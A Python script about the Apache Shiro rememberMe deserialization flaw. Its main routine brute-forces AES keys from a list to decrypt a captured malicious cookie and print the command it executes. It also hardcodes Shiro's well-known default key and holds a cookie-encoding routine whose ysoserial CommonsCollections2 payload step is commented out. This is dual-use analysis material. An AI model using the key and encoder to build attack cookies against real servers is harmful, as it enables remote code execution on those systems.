# -*- coding:utf-8 -*-
__author__ = 'leezp'
__date__ = 20200626
import base64
import uuid
from Crypto.Cipher import AES
import re

str1 = '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'
mode = AES.MODE_CBC
key = "kPH+bIxk5D2deZiIxcaaaA=="


def encode_rememberme(command):
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-30099844c6-1.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
    popen = b'test'
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    # file_body = pad(popen.stdout.read())
    file_body = pad(popen)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


# encoder_cookie = encode_rememberme("touch /tmp/success")
# print(encode_rememberme("touch /tmp/success"))


def decode_rememberme(encoder_cookie):
    f = open('shiro_96key.txt', "r", encoding='utf-8')
    try:
        for line in f:
            key = line.strip()
            iv = base64.b64decode(encoder_cookie)[0:16]
            encryptor_body = base64.b64decode(encoder_cookie)[16:]
            decryptor = AES.new(base64.b64decode(key), mode, iv)  # 参数为 bytes
            # print(decryptor.decrypt(encryptor_body).strip())
            if b'exec' in decryptor.decrypt(encryptor_body).strip():
                print('序列化用的key为            :' + key)
                regex = re.compile('([\s\S]{50})exec')
                str = decryptor.decrypt(encryptor_body).strip().decode('utf-8',
                                                                       "ignore")  # .decode('utf-8',"ignore") 解决'utf-8' codec can't decode byte 0xac in position 0: invalid start byte
                if regex.search(str).group(1):
                    print('序列化命令执行的代码片段为 :' + regex.search(str).group(1))
                    regex2 = re.compile('[^\w\s/](\w[\w\s/]*)[^\w\s/]')
                    print('序列化执行的命令为         : ' + regex2.search(regex.search(str).group(1).strip()).group(1))
                return
    except Exception as e:
        print(e)
        pass


# decode_rememberme(encoder_cookie)
decode_rememberme(str1.encode())  # str 转 bytes
